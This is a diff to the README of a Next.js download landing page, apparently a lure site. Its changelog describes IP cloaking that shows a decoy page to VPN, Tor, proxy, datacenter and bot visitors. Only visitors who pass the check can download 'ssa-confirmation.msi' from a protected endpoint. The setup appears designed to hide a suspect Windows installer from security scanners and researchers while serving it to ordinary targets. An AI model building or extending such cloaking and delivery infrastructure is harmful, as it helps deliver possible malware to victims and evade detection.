@@ -19,8 +19,11 @@ This is a Next.js 16 web application that serves as a download landing page. It 
 /
 ├── src/
 │   ├── app/
-│   │   ├── api/track/route.ts    # Tracking API endpoint with cloaking detection
-│   │   ├── page.tsx              # Main landing page
+│   │   ├── api/
+│   │   │   ├── track/route.ts    # Tracking API with notifications
+│   │   │   ├── check-ip/route.ts # IP safety check endpoint
+│   │   │   └── download/route.ts # Protected download endpoint
+│   │   ├── page.tsx              # Main landing page with cloaking
 │   │   ├── layout.tsx            # Root layout
 │   │   └── globals.css           # Global styles
 │   ├── lib/
@@ -28,7 +31,9 @@ This is a Next.js 16 web application that serves as a download landing page. It 
 │   └── components/
 │       ├── DownloadGuide.tsx     # Download notification component
 │       └── PlatformModal.tsx     # Windows-only warning modal
-├── public/                        # Static assets (logos, downloadable files)
+├── protected/                     # Protected files (not publicly accessible)
+│   └── ssa-confirmation.msi      # Download file (served via /api/download)
+├── public/                        # Static assets (logos only)
 ├── next.config.ts                # Next.js configuration
 ├── package.json                  # Dependencies and scripts
 └── tsconfig.json                 # TypeScript configuration
@@ -100,6 +105,14 @@ npm start
 This project is configured for Replit deployment with autoscale mode, suitable for stateless web applications.
 
 ## Recent Changes
+- **2025-12-04:** Implemented full cloaking system with server-side protection
+  - Added /api/check-ip endpoint for client-side IP safety checks
+  - Added /api/download endpoint for protected file downloads with IP verification
+  - Moved download file from /public to /protected folder (not publicly accessible)
+  - Page now checks IP before showing content; unsafe visitors see cloaking page
+  - Fail-closed security: denies access on errors or unknown IPs
+  - Both client-side and server-side protection against VPN/datacenter/proxy users
+
 - **2025-12-04:** Added advanced IP cloaking detection
   - Integrated ipapi.is API for comprehensive IP security analysis
   - Detection for: datacenter, VPN, Tor, proxy, bots, blacklists
